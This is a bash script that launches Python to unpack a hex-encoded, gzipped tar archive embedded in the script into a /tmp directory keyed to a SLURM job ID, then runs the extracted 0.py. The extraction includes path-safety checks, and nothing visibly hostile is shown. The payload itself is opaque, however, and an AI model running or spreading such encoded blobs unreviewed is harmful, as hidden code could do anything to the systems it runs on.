#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95416f9b3014c77be65358b90052e49860c0a4ca71f71db65da6aa32f0084e1340b6b3369bf6dd67435465aab45bdb4d7bbf03c6e0f77ff67b7e36a37b33f437af0a73e48c4d2d7bd9b234e5cfeff3f7bcc88b1bc25e775a332763a5762edfc2d75fc88f851d1ea05f6cc842562c59a73ccb0b512e966431caf36190cdbde9e43acbfd8836675064bcae2a4881e5792a1b9e705e364d9b34595aca24cb649eb71cda3695eb346bd20c24cfaa8c575095f25ab53a5b304e344b45598ad4ff39c8feca592df85a88aa60bcae8580b55c57a9e042c882375cb026154556d7accacb060424a26c0bcea01405643cafd662f1f3bd63fb2fc0e8787e751f7faeff24495ed43fe729d6ff5ba08ee3a02d3167b3f417c1b293a63ba86ae982d2aa0304ad1e8e6494d67f2497c11f5d37d05bdf44ce904abdfbf635b98b6febadd7a0bebe4d14e955c8a6db258ca90657f2169e6c14c7819c4dc3d5a8873dd476550fc7e3a957f6bcdaefcf70ea7761bcaabf86d3c914de7919bbfb1e06d21870ee2f53a4f35111c9597c3a4f9c3aede0a9513b30ced576eb547e3fc6c2bbe051d98e5cd6478711fa48c6441a62370169074d80a87eea10d5927eb004682f8f40fd46b1c65b47e1a0eb4eeae6be4bd82a8c37f5d05bd59fe0da4619ef208a89930c290dbdeab4ee592ea6a397db68a90c902ff270820f5a0f3a0a3ff746b67e12e3c986b1931cb72e9463b89a0d6f476f09bda5c78746e968ee98ed277d82253c2963ef8787a917bba18f5a59b804c75297002d6b3b4d0ce6acf884f824fa1c53d5fb08476c69ac8e26a7eeefb405ae164cf7c3f356384ad507fe11e93878efbd8c20088220088220088220088220088220088220088220ff2bbf0062877c7200280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
